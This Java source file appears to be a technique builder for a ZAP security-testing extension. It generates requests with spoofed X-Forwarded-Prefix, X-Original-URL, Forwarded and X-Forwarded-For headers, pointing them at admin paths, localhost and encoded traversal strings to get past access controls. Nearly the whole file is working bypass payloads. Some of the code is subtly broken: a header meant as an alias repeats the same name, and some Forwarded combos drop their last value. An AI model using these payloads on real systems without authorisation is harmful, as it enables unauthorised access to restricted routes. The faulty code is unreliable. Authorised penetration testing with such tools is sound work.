package org.zaproxy.zap.extension.hacktor.technique;

import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.zap.extension.hacktor.Technique;
import java.util.List;
import java.util.function.BiConsumer;

/**
 * Reverse-proxy routing / prefix deception.
 *
 * Proxies route or rewrite requests based on trusted-but-client-supplied headers
 * (X-Forwarded-Prefix, X-Forwarded-Host, Forwarded, X-Original-URL, X-Rewrite-URL).
 * Supplying router-facing values can redirect or alias a restricted origin route so
 * that access-control middleware scoped to the original path is bypassed.
 */
public class XForwardedPrefixTechniqueBuilder extends AbstractTechniqueBuilder {
    @Override public String getFamily() { return "X-Forwarded Prefix"; }
    @Override public int getOrder() { return 52; }

    @Override
    public void build(List<Technique> techs, BiConsumer<HttpMessage, String> setPath,
                      TechniqueBuilder.PathContext ctx) {
        // X-Forwarded-Prefix: upstream apps (traefik, ingress-nginx) use it to build
        // redirects / mount apps at a prefix. Pointing it at admin paths can alias routes.
        String[] prefixes = {
            ctx.parent, ctx.baseClean, "/admin", "/", "//", "/admin/",
            "/internal", "/console", "/manage", "/debug", "/api", "/v1",
            "/../", "/%2e", "/%2e%2e", "/;"
        };
        for (String pfx : prefixes) {
            final String p = pfx;
            techs.add(new Technique("X-Forwarded Prefix", "FPrefix:" + trunc(pfx.replace("/","S").replace(".","D").replace(";","SC"), 14),
                "X-Forwarded-Prefix set to: " + pfx,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "X-Forwarded-Prefix", p);
                    // Mirror to the less-common alias used by some proxies
                    addHeader(c, "X-Forwarded-Prefix", p);
                    return c; }));
        }

        // X-Original-URL / X-Rewrite-URL with double-encoded and prefixed values
        String[] xow = {
            ctx.baseClean + "%252e", ctx.baseClean + "%252e%252e",
            "/admin" + ctx.baseClean, "//" + ctx.lastSeg,
            ctx.baseClean + "/%252e", "http://127.0.0.1" + ctx.baseClean,
        };
        for (String v : xow) {
            final String val = v;
            techs.add(new Technique("X-Forwarded Prefix", "FPrefixXow:" + trunc(v.replace("/","S").replace(".","D").replace("%","P"), 16),
                "X-Original-URL / X-Rewrite-URL: " + v,
                base -> {
                    HttpMessage c = cloneMsg(base);
                    addHeader(c, "X-Original-URL", val);
                    addHeader(c, "X-Rewrite-URL", val);
                    return c; }));
        }

        // Forwarded header combos (RFC 7239 style)
        String[][] forwardedCombos = {
            {"Forwarded","host=admin","proto=https"},
            {"Forwarded","for=127.0.0.1;host=admin;proto=https"},
            {"Forwarded","for=127.0.0.1;host=localhost;proto=http"},
            {"Forwarded","by=proxy;for=127.0.0.1;host=internal"},
            {"X-Forwarded-For","127.0.0.1","X-Forwarded-Host","admin"},
            {"X-Forwarded-For","127.0.0.1","X-Forwarded-Proto","https","X-Forwarded-Host","internal"},
            {"X-Forwarded-For","127.0.0.1","X-Forwarded-Port","443","X-Forwarded-Scheme","https"},
            {"X-Real-IP","127.0.0.1","X-Forwarded-Host","admin","X-Forwarded-Prefix","/admin"},
            {"X-Original-URL",ctx.baseClean,"X-Forwarded-Host","admin"},
        };
        for (String[] combo : forwardedCombos) {
            final String[] c = combo;
            techs.add(new Technique("X-Forwarded Prefix", "FPrefixCombo:" + trunc(combo[0].replace("-",""), 12),
                "Forwarded header combo: " + String.join(" ", combo),
                base -> {
                    HttpMessage m = cloneMsg(base);
                    for (int i = 0; i + 1 < c.length; i += 2) {
                        addHeader(m, c[i], c[i + 1]);
                    }
                    return m; }));
        }
    }
}
